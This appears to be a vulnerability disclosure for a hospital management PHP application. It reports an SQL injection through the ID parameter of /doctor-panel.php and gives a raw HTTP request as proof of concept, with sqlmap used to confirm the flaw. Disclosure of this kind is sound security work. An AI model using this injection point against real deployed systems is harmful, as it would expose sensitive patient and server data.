# ponaravindb/Hospital-Management - System sql injection in /doctor-panel.php
# Supplier
https://github.com/ponaravindb/Hospital-Management-System
# Description
An unrestricted SQL injection attack exists in ponaravindb-Hospital-Management-System in /doctor-panel.php The parameters that can be controlled are as follows: $ID. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.
# Code analysis
When the value of $ID parameter is obtained in /doctor-panel.php. , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability.![image](https://github.com/user-attachments/assets/f8bce646-57bb-48f7-a039-e7726bb3d5c2)

# PoC
```
GET /doctor-panel.php?cancel=1&ID=1* HTTP/1.1
Host: hospital-management-system-master
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101
Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=go9un4j5krlradoci4pk1icb3h
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
# Result
utilizing sqlmap
![image](https://github.com/user-attachments/assets/ecf792bc-d1de-4461-ad45-044b31ba4527)
